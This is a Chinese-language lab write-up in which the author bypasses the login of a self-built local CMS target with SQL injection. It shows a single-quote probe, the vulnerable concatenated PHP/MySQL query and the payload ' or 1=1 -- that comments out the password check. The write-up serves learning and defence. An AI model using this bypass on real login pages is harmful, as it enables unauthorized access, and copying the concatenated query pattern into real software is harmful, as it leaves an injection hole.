# SQL注入：万能用户名

## 1. 实验环境

- 靶场：自建本地 CMS 靶场（PHP + MySQL + Apache）
- 工具：Chrome + Burp Suite+HackBar
- 页面：`/cms/admin/login.php`
- 注入点：`username`

------

## 2. 正常请求

正常登录：

```text
username=admin
password=123
```

Burp 抓到：

```http
POST /cms/admin/login.action.php HTTP/1.1

username=admin&image.x=0&image.y=0&password=123
```

登录失败。

------

## 3. 尝试判断注入

先在 username 输入：

```text
'
```

请求：

```http
username='&password=123456
```

页面出现异常。

说明这个参数可能进入了后端 SQL 查询。

------

## 4. 分析后端 SQL

我自己搭建的靶场中，后端查询逻辑为：

```sql
select userid from cms_users where username = '".$username."' and password='".md5 ( $password ) ."'
```

所以正常情况下：

```sql
username = 'admin'
AND password = '123456'
```

------

## 5. 尝试绕过

在靶场中修改 username，观察 SQL 逻辑变化。

核心思路：

```text
结束原来的字符串
↓
加入新的条件
↓
注释掉后面的密码判断
```

测试成功后，页面进入登录后的页面。

------

## 6. Burp 请求

<img src=".\images\01.png" alt="image-20260921160945259" style="zoom: 67%;" />

<img src=".\images\02.png" alt="image-20260921161028626"  />

------

## 7. 为什么成功

改变原有sql逻辑：

```sql
select userid from cms_users where username = '777' or 1=1 --  and password='".md5 ( $password ) ."'
```

通过构造输入后，改变了原 SQL 的结构，使后面的密码验证不再按照原本的逻辑执行。

所以这里绕过的本质是：

> **SQL 破解了逻辑，而不是破解了密码。**

------

## 8. 这次真正学到的

- 单引号可以用来观察输入是否进入 SQL 字符串
- AND 和OR可以改变条件逻辑
- SQL 注释可以影响后面的语句
- Burp 可以直接看到实际发送的参数
- SQL 注入的核心是“利用用户输入影响 SQL 语句”

------

## 9. 我的疑问

### 为什么 `--` 后面要加空格？

因为 MySQL 对 `--` 注释有特定语法要求。

### `#` 和 `--` 有什么区别？

两者都可以用于注释，但具体语法和使用场景存在区别。在url中，#应用%23表示，空格应用+表示。

------